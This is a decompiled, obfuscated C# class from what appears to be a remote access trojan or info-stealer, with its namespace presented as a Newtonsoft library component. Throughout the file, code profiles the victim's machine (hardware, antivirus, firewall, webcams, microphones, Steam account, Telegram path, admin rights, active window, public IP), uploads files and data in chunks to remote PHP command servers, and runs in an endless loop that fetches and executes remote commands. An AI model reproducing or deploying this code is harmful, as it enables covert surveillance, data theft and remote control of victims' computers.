using GDBD.Importers;
using GDBD.Items;
using GDBD.Mappers;
using GDBD.Mocks;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Newtonsoft.Annotations;
using Newtonsoft.Database;
using Newtonsoft.Resolver;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Newtonsoft.Expressions
{
	internal sealed class DispatcherInstanceExpression
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public string _0001;

			public string _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				ManageFilter("sysinfo", new DecoratorReaderMapper
				{
					["GPUName"] = ParserFilterResolver._0001(GlobalIssuerImporter.SelectList()),
					["CPUName"] = ParserFilterResolver._0001(GlobalIssuerImporter.StartList()),
					["BIOS"] = ParserFilterResolver._0001(GlobalIssuerImporter.CalculateList()),
					["LANIP"] = ParserFilterResolver._0001(GlobalIssuerImporter.DeleteList()),
					["Antivirus"] = ParserFilterResolver._0001(GlobalIssuerImporter.PostList()),
					["Firewall"] = ParserFilterResolver._0001(GlobalIssuerImporter.ChangeList()),
					["Motherboard"] = ParserFilterResolver._0001(GlobalIssuerImporter.GetList()),
					["RAM"] = ParserFilterResolver._0001(GlobalIssuerImporter.ListList()),
					["Webcams"] = ParserFilterResolver._0001(DatabaseTestItem.AwakeEvent()),
					["Screens"] = ParserFilterResolver._0001(DatabaseTestItem.UpdateEvent()),
					["Microphones"] = ParserFilterResolver._0001(DatabaseTestItem.ReadEvent()),
					["SteamPath"] = ParserFilterResolver._0001(DatabaseTestItem.ResetEvent()),
					["SteamLang"] = ParserFilterResolver._0001(DatabaseTestItem.ReflectEvent()),
					["SteamUser"] = ParserFilterResolver._0001(DatabaseTestItem.CalcEvent()),
					["SteamUserID"] = ParserFilterResolver._0001(DatabaseTestItem.InstantiateEvent()),
					["TelegramPath"] = ParserFilterResolver._0001(DatabaseTestItem.InterruptEvent()),
					["FrameworkVersion"] = ParserFilterResolver._0001(GlobalIssuerImporter.RateList()),
					["Path"] = ParserFilterResolver._0001(Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent))
				}.SetClass((TimeState)0, new BroadcasterError[0]), this._0001, _0002);
			}
		}

		[CompilerGenerated]
		private sealed class _0002
		{
			public string _0001;

			public string _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0002()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				SortFilter(this._0001, _0002);
				DecoratorReaderMapper decoratorReaderMapper = new DecoratorReaderMapper
				{
					["ServerType"] = ParserFilterResolver._0001("C#"),
					["ServerVer"] = ParserFilterResolver._0001(MappingListAnnotation._RegistryEvent),
					["isMicrophone"] = ParserFilterResolver._0001((DecoratorList._0001() > 0) ? "Y" : "N"),
					["isWebcam"] = ParserFilterResolver._0001((new AccountInstanceExpression(WrapperIssuerImporter.serializerEvent).Count > 0) ? "Y" : "N"),
					["isAdmin"] = ParserFilterResolver._0001(GlobalIssuerImporter.DestroyList() ? "Y" : "N"),
					["WinVer"] = ParserFilterResolver._0001(ObserverEvent.VerifyList()),
					["ACTWindow"] = ParserFilterResolver._0001(Publisher.InitEvent()),
					["PCName"] = ParserFilterResolver._0001(GlobalIssuerImporter.SetList()),
					["UserName"] = ParserFilterResolver._0001(GlobalIssuerImporter.RemoveList()),
					["TAG"] = ParserFilterResolver._0001(DecoratorReaderMapper.PatchRequest(MappingListAnnotation.m_ServiceEvent)["TAG"].ResetClass<string>()),
					["IpInfo"] = DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList("https://ipinfo.io/json"))
				};
				while (true)
				{
					try
					{
						decoratorReaderMapper["ACTWindow"] = ParserFilterResolver._0001(Publisher.InitEvent());
						string text = ClassEvent.SearchFilter(DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(this._0001 + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(this._0001)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(_0002))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "getdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "getdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("command" + MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "setdata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(decoratorReaderMapper.SetClass((TimeState)0, new BroadcasterError[0])))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0001) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("usermaindata" + this._0001))))))["response"].ResetClass<string>());
						if (text.Length > 1)
						{
							DecoratorReaderMapper decoratorReaderMapper2 = DecoratorReaderMapper.PatchRequest(text);
							if (decoratorReaderMapper2.get_Count() > 0)
							{
								DecoratorEventEntry.PatchRecord(decoratorReaderMapper2["Command"].ResetClass<string>(), decoratorReaderMapper2["Data"].ResetClass<string>(), this._0001, _0002);
							}
						}
						Thread.Sleep(1000);
					}
					catch
					{
						Thread.Sleep(10000);
					}
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string[] AssetFilter(string instance, string connection)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string text = null;
			string text2 = null;
			string text3 = instance.Remove(instance.LastIndexOf("/"), instance.Length - instance.LastIndexOf("/"));
			string text4 = connection.Remove(connection.LastIndexOf("/"), connection.Length - connection.LastIndexOf("/"));
			try
			{
				if (DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(text3 + "/" + ClassEvent.RegisterFilter(instance) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(instance) + "password") + "=c"))["status"].ResetClass<string>() == "UP")
				{
					text = instance;
					text2 = DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(text3 + "/" + ClassEvent.RegisterFilter(instance) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(instance) + "gettoken") + "=" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(instance)) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(instance) + "uid") + "=" + ClassEvent.RegisterFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent))))["token"].ResetClass<string>();
				}
				else
				{
					text = connection;
					text2 = DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(text4 + "/" + ClassEvent.RegisterFilter(connection) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "gettoken") + "=" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection)) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "uid") + "=" + ClassEvent.RegisterFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent))))["token"].ResetClass<string>();
				}
			}
			catch
			{
				try
				{
					if (DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(text4 + "/" + ClassEvent.RegisterFilter(connection) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "password") + "=c"))["status"].ResetClass<string>() == "UP")
					{
						text = connection;
						text2 = DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(text4 + "/" + ClassEvent.RegisterFilter(connection) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "gettoken") + "=" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection)) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "uid") + "=" + ClassEvent.RegisterFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent))))["token"].ResetClass<string>();
					}
				}
				catch
				{
				}
			}
			return new string[2]
			{
				text,
				text2
			};
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static HttpWebResponse CustomizeFilter(byte[] asset, string token, string state, string last2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(ClassEvent.ResetFilter(ItemEventEntry.InvokeList(state) + "uploadfile_name"), MappingListAnnotation._ProxyEvent + "." + ClassEvent.ResetFilter(token + MappingListAnnotation._ProxyEvent));
			dictionary.Add(ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + "." + ClassEvent.ResetFilter(token + MappingListAnnotation._ProxyEvent)), new ItemEventEntry.UtilsEvent(asset, MappingListAnnotation._ProxyEvent + "." + ClassEvent.ResetFilter(token + MappingListAnnotation._ProxyEvent), ClassEvent.ResetFilter(token + MappingListAnnotation._ProxyEvent)));
			string param = state + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(state)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(state) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(last2))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(state) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent))));
			return ItemEventEntry.PrintList(param, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36", dictionary);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void QueryFilter(string value, string map)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ItemEventEntry.ConcatList(value + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(value)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(value) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(map))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(value) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(value) + "setdata") + "=%00&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(value) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(value) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("command" + MappingListAnnotation._ProxyEvent)))));
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void CancelFilter(string key, string ord, string helper, string reference2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ItemEventEntry.ConcatList(helper + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(helper)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(helper) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(reference2))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(helper) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(helper) + "setdata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ord))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(helper) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(helper) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(key + "_status" + MappingListAnnotation._ProxyEvent)))));
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void ExcludeFilter(string value, string cont, string dir, string init2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ItemEventEntry.ConcatList(dir + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(dir)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(dir) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(init2))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(dir) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(dir) + "setdata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(cont))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(dir) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(dir) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(value + MappingListAnnotation._ProxyEvent)))));
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string SetupFilter(string value, string connection, string pool)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return ClassEvent.SearchFilter(DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(connection + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(connection)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(pool))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "getdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(connection) + "getdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(value + MappingListAnnotation._ProxyEvent))))))["response"].ResetClass<string>());
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void ManageFilter(string v, string ord, string temp, string v2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ItemEventEntry.ConcatList(temp + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(temp)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(temp) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(v2))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(temp) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(temp) + "setdata") + "=%00&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(temp) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(temp) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(v + MappingListAnnotation._ProxyEvent)))));
			foreach (string item in ReponseClassSpec.CheckList(ord, 1500))
			{
				CollectFilter(v, item, temp, v2);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void InitFilter(string instance, string reg, string control, string item2, string ord3)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ItemEventEntry.ConcatList(item2 + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(item2)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ord3))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "setdata") + "=%00&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(reg + MappingListAnnotation._ProxyEvent)))));
			List<string> list = ReponseClassSpec.CheckList(control, 1500);
			double num = 100.0 / (double)list.Count;
			double num2 = 0.0;
			for (int i = 0; i < list.Count; i++)
			{
				num2 += num;
				ItemEventEntry.ConcatList(item2 + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(item2)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ord3))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "adddata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(list[i]))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "adddata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "adddata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(reg + MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "setdata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter("Transfering data: " + Math.Round(num2, 1) + "%"))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(item2) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(instance + "_status" + MappingListAnnotation._ProxyEvent)))));
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void DefineFilter(string instance, string counter, string third, string t2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			foreach (string item in ReponseClassSpec.CheckList(counter, 1500))
			{
				CollectFilter(instance, item, third, t2);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void CollectFilter(string item, string connection, string proc, string second2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			ItemEventEntry.ConcatList(proc + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(proc)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(proc) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(second2))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(proc) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(proc) + "adddata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(connection))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(proc) + "adddata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(proc) + "adddata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter(item + MappingListAnnotation._ProxyEvent)))));
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static void SortFilter(string setup, string visitor)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			new Thread((ThreadStart)delegate
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				ManageFilter("sysinfo", new DecoratorReaderMapper
				{
					["GPUName"] = ParserFilterResolver._0001(GlobalIssuerImporter.SelectList()),
					["CPUName"] = ParserFilterResolver._0001(GlobalIssuerImporter.StartList()),
					["BIOS"] = ParserFilterResolver._0001(GlobalIssuerImporter.CalculateList()),
					["LANIP"] = ParserFilterResolver._0001(GlobalIssuerImporter.DeleteList()),
					["Antivirus"] = ParserFilterResolver._0001(GlobalIssuerImporter.PostList()),
					["Firewall"] = ParserFilterResolver._0001(GlobalIssuerImporter.ChangeList()),
					["Motherboard"] = ParserFilterResolver._0001(GlobalIssuerImporter.GetList()),
					["RAM"] = ParserFilterResolver._0001(GlobalIssuerImporter.ListList()),
					["Webcams"] = ParserFilterResolver._0001(DatabaseTestItem.AwakeEvent()),
					["Screens"] = ParserFilterResolver._0001(DatabaseTestItem.UpdateEvent()),
					["Microphones"] = ParserFilterResolver._0001(DatabaseTestItem.ReadEvent()),
					["SteamPath"] = ParserFilterResolver._0001(DatabaseTestItem.ResetEvent()),
					["SteamLang"] = ParserFilterResolver._0001(DatabaseTestItem.ReflectEvent()),
					["SteamUser"] = ParserFilterResolver._0001(DatabaseTestItem.CalcEvent()),
					["SteamUserID"] = ParserFilterResolver._0001(DatabaseTestItem.InstantiateEvent()),
					["TelegramPath"] = ParserFilterResolver._0001(DatabaseTestItem.InterruptEvent()),
					["FrameworkVersion"] = ParserFilterResolver._0001(GlobalIssuerImporter.RateList()),
					["Path"] = ParserFilterResolver._0001(Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent))
				}.SetClass((TimeState)0, new BroadcasterError[0]), setup, visitor);
			}).Start();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void CallFilter(string asset, string selection)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			new Thread((ThreadStart)delegate
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				SortFilter(asset, selection);
				DecoratorReaderMapper decoratorReaderMapper = new DecoratorReaderMapper
				{
					["ServerType"] = ParserFilterResolver._0001("C#"),
					["ServerVer"] = ParserFilterResolver._0001(MappingListAnnotation._RegistryEvent),
					["isMicrophone"] = ParserFilterResolver._0001((DecoratorList._0001() > 0) ? "Y" : "N"),
					["isWebcam"] = ParserFilterResolver._0001((new AccountInstanceExpression(WrapperIssuerImporter.serializerEvent).Count > 0) ? "Y" : "N"),
					["isAdmin"] = ParserFilterResolver._0001(GlobalIssuerImporter.DestroyList() ? "Y" : "N"),
					["WinVer"] = ParserFilterResolver._0001(ObserverEvent.VerifyList()),
					["ACTWindow"] = ParserFilterResolver._0001(Publisher.InitEvent()),
					["PCName"] = ParserFilterResolver._0001(GlobalIssuerImporter.SetList()),
					["UserName"] = ParserFilterResolver._0001(GlobalIssuerImporter.RemoveList()),
					["TAG"] = ParserFilterResolver._0001(DecoratorReaderMapper.PatchRequest(MappingListAnnotation.m_ServiceEvent)["TAG"].ResetClass<string>()),
					["IpInfo"] = DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList("https://ipinfo.io/json"))
				};
				while (true)
				{
					try
					{
						decoratorReaderMapper["ACTWindow"] = ParserFilterResolver._0001(Publisher.InitEvent());
						string text = ClassEvent.SearchFilter(DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(asset + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(asset)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(selection))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "getdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "getdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("command" + MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "setdata") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(decoratorReaderMapper.SetClass((TimeState)0, new BroadcasterError[0])))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(asset) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("usermaindata" + asset))))))["response"].ResetClass<string>());
						if (text.Length > 1)
						{
							DecoratorReaderMapper decoratorReaderMapper2 = DecoratorReaderMapper.PatchRequest(text);
							if (decoratorReaderMapper2.get_Count() > 0)
							{
								DecoratorEventEntry.PatchRecord(decoratorReaderMapper2["Command"].ResetClass<string>(), decoratorReaderMapper2["Data"].ResetClass<string>(), asset, selection);
							}
						}
						Thread.Sleep(1000);
					}
					catch
					{
						Thread.Sleep(10000);
					}
				}
			}).Start();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public DispatcherInstanceExpression()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}
